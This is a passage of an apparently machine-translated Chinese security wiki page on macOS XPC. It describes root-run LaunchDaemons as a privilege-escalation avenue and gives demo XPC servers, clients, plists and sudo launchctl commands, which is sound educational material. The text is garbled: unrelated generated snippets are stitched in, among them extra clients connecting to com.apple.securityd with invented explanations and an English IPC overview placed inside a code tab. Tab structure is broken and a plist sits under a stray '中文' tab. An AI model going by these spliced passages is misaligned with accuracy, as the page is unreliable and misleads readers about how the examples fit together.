<key>com.jamf.management.daemon.selfservice</key>
<true/>
<key>com.jamf.management.daemon.service</key>
<true/>
</dict>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
**`LaunchDameons`**中的进程由root用户运行。因此，如果一个非特权进程可以与其中一个进程通信，它可能能够提升权限。

### XPC事件消息

应用程序可以订阅不同的事件消息，使它们能够在发生这些事件时按需启动。这些服务的设置是在**launchd plist文件**中完成的，位于与前面的文件相同的目录中，并包含一个额外的**`LaunchEvent`**键。

### XPC连接进程检查

当一个进程尝试通过XPC连接调用一个方法时，XPC服务应该检查该进程是否被允许连接。以下是检查的常见方式和常见陷阱：

{% content-ref url="macos-xpc-connecting-process-check.md" %}
[macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
{% endcontent-ref %}

### XPC授权

Apple还允许应用程序**配置一些权限以及如何获取这些权限**，因此如果调用进程具有这些权限，它将被允许调用XPC服务的方法：

{% content-ref url="macos-xpc-authorization.md" %}
[macos-xpc-authorization.md](macos-xpc-authorization.md)
{% endcontent-ref %}

### C代码示例

{% tabs %}
{% tab title="xpc_server.c" %}
```c
// gcc xpc_server.c -o xpc_server

#include <xpc/xpc.h>

static void handle_event(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "message");
printf("Received message: %s\n", received_message);

// Create a response dictionary
xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(response, "received", "received");

// Send response
xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
xpc_connection_send_message(remote, response);

// Clean up
xpc_release(response);
}
}

static void handle_connection(xpc_connection_t connection) {
xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
handle_event(event);
});
xpc_connection_resume(connection);
}

int main(int argc, const char *argv[]) {
xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
dispatch_get_main_queue(),
XPC_CONNECTION_MACH_SERVICE_LISTENER);
if (!service) {
fprintf(stderr, "Failed to create service.\n");
exit(EXIT_FAILURE);
}

xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
xpc_type_t type = xpc_get_type(event);
if (type == XPC_TYPE_CONNECTION) {
handle_connection(event);
}
});

xpc_connection_resume(service);
dispatch_main();

return 0;
}
```
{% tab title="xpc_client.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <xpc/xpc.h>

int main(int argc, const char * argv[]) {
    xpc_connection_t connection = xpc_connection_create_mach_service("com.apple.securityd", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
    
    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        xpc_type_t type = xpc_get_type(event);
        
        if (type == XPC_TYPE_DICTIONARY) {
            const char *description = xpc_dictionary_get_string(event, "description");
            printf("Received event: %s\n", description);
        }
    });
    
    xpc_connection_resume(connection);
    
    dispatch_main();
    
    return 0;
}
```

这是一个简单的XPC客户端示例，它连接到名为"com.apple.securityd"的Mach服务，并接收来自该服务的事件。当收到事件时，它会打印事件的描述信息。

要编译此代码，您需要在命令行中使用以下命令：

```bash
clang -o xpc_client xpc_client.c -lxpc
```

然后，您可以运行生成的可执行文件：

```bash
./xpc_client
```

请注意，此示例需要在具有足够权限的环境中运行，因为它连接到了一个特权的Mach服务。
```c
// gcc xpc_client.c -o xpc_client

#include <xpc/xpc.h>

int main(int argc, const char *argv[]) {
xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "received");
printf("Received message: %s\n", received_message);
}
});

xpc_connection_resume(connection);

xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(message, "message", "Hello, Server!");

xpc_connection_send_message(connection, message);

dispatch_main();

return 0;
}
```
{% tab title="xyz.hacktricks.service.plist" %}xyz.hacktricks.service.plist是一个属性列表文件，用于配置macOS系统中的服务。它定义了服务的名称、描述、启动方式和其他相关属性。在macOS中，服务是一种后台进程，可以在系统启动时自动启动，并在后台运行。通过编辑和配置xyz.hacktricks.service.plist文件，可以对服务进行自定义设置和管理。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.service</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.service</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc xpc_server.c -o xpc_server
gcc xpc_client.c -o xpc_client

# Save server on it's location
cp xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.service.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist

# Call client
./xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.service.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
```
### ObjectiveC 代码示例

{% tabs %}
{% tab title="oc_xpc_server.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

@interface MyXPCObject : NSObject <MyXPCProtocol>
@end


@implementation MyXPCObject
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply {
NSLog(@"Received message: %@", some_string);
NSString *response = @"Received";
reply(response);
}
@end

@interface MyDelegate : NSObject <NSXPCListenerDelegate>
@end


@implementation MyDelegate

- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];

MyXPCObject *my_object = [MyXPCObject new];

newConnection.exportedObject = my_object;

[newConnection resume];
return YES;
}
@end

int main(void) {

NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];

id <NSXPCListenerDelegate> delegate = [MyDelegate new];
listener.delegate = delegate;
[listener resume];

sleep(10); // Fake something is done and then it ends
}
```
{% tab title="oc_xpc_client.m" %}oc_xpc_client.m文件

```objective-c
#import <Foundation/Foundation.h>
#import <xpc/xpc.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        xpc_connection_t connection = xpc_connection_create_mach_service("com.apple.securityd", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
        xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
            xpc_type_t type = xpc_get_type(event);
            if (type == XPC_TYPE_DICTIONARY) {
                const char *description = xpc_dictionary_get_string(event, "description");
                if (description) {
                    printf("%s\n", description);
                }
            }
        });
        xpc_connection_resume(connection);
        dispatch_main();
    }
    return 0;
}
```

这是一个使用Objective-C编写的文件，用于创建一个XPC客户端连接到`com.apple.securityd`服务。它使用`xpc_connection_create_mach_service`函数创建一个特权的Mach服务连接，并使用`xpc_connection_set_event_handler`函数设置一个事件处理程序。当接收到事件时，它会检查事件的类型是否为字典类型，并获取字典中的"description"键对应的字符串，并将其打印出来。最后，它通过调用`dispatch_main`函数来保持程序的运行。

该文件可以用于在macOS系统中进行进程间通信（IPC）和特权升级的研究和开发。
```objectivec
// gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

int main(void) {
NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
[connection resume];

[[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
NSLog(@"Received response: %@", response);
}];

[[NSRunLoop currentRunLoop] run];

return 0;
}
```
# macOS IPC (Inter-Process Communication)

Inter-Process Communication (IPC) is a mechanism that allows different processes to communicate with each other. In macOS, there are several IPC mechanisms available, including:

- **Mach Ports**: Mach ports are the fundamental IPC mechanism in macOS. They allow processes to send messages to each other and share resources.
- **XPC**: XPC (Cross-Process Communication) is a high-level IPC mechanism provided by macOS. It allows processes to communicate with each other using a simple and secure API.
- **Distributed Objects**: Distributed Objects is a legacy IPC mechanism in macOS. It allows objects to be shared between processes using a remote procedure call (RPC) mechanism.
- **Unix Domain Sockets**: Unix domain sockets are a type of IPC mechanism that allows communication between processes on the same machine using the file system.

Each IPC mechanism has its own advantages and use cases. Understanding how these mechanisms work can be useful for both security researchers and developers.

In this section, we will explore the different IPC mechanisms available in macOS and discuss their security implications. We will also cover techniques for analyzing and exploiting vulnerabilities in IPC implementations.

## Table of Contents

- [Mach Ports](mach-ports.md)
- [XPC](xpc.md)
- [Distributed Objects](distributed-objects.md)
- [Unix Domain Sockets](unix-domain-sockets.md)

{% endtab %}

{% tab title="中文" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.svcoc</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.svcoc</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/oc_xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/oc_xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client

# Save server on it's location
cp oc_xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.svcoc.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist

# Call client
./oc_xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
```
## 参考资料

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
